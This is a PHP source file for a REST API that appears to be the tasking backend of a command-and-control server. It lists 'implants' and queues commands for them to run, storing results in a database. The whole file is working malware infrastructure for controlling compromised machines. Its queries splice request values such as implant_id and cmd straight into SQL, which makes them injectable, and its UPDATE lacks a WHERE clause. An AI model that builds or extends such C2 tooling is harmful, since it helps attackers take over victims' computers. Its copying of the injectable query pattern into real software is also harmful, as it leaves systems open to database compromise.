<?php

require_once 'db.php';

header("Content-Type: application/json; charset=UTF-8");
//header("Access-Control-Allow-Origin: *");
//header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE");

$parts = explode("/", $_SERVER["REQUEST_URI"]);

if ($parts[1] != "api") {
    http_response_code(404);
    die();
}

function handle_method() {
    global $parts, $pdo;

    $method = $_SERVER["REQUEST_METHOD"];
    switch ($method) {
        case "GET":
            switch ($parts[2]) {
                case "implants":
                    $stmt = $pdo->query("SELECT * FROM Implants");
                    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
                    echo json_encode($results);
                    break;
                case "tasks":
                    $implant_id = $parts[3] ?? null;
                    if ($implant_id == null) {
                        $stmt = $pdo->query("SELECT * FROM Tasks");
                        $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
                        echo json_encode($results);
                        break;
                    }
                    $stmt = $pdo->query("SELECT task_id, command, response, status FROM Tasks WHERE implant_id = '$implant_id'");
                    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
                    echo json_encode($results);
                    break;
                default;
                http_response_code(404);
                die();
            }
            break;
        case "PUT":
            switch ($parts[2]) {
            case "new_task":
                $implant_id = $parts[3] ?? null;
                if ($implant_id == null) {
                    // find suitable response code
                    http_response_code(404);
                    die();
                }
                if (!isset($_POST['cmd'])) {
                    http_response_code(304);
                    die();
                }
                $cmd = $_POST['cmd'];
                $stmt = $pdo->query("UPDATE Tasks SET implant_id = '$implant_id', command = '$cmd'");
                $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
                echo json_encode($results);
                break;
                default;
                    http_response_code(404);
                    die();
            }

            break;
        case "POST":
            switch ($parts[2]) {

                case "new_task":
                    $implant_id = $parts[3] ?? null;
                    if ($implant_id == null) {
                        // find suitable response code
                        http_response_code(404);
                        die();
                    }
                    if (!isset($_POST['cmd'])) {
                        http_response_code(304);
                        die();
                    }
                    $cmd = $_POST['cmd'];
                    $stmt = $pdo->query("INSERT INTO Tasks (implant_id, command) VALUES ('$implant_id', '$cmd')");
                    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
                    echo json_encode($results);
                    break;
                default;
                http_response_code(404);
                die();
            }
            break;
        case "DELETE":
            break;
        default:
            http_response_code(404);
            die();
    }
}

handle_method();

?>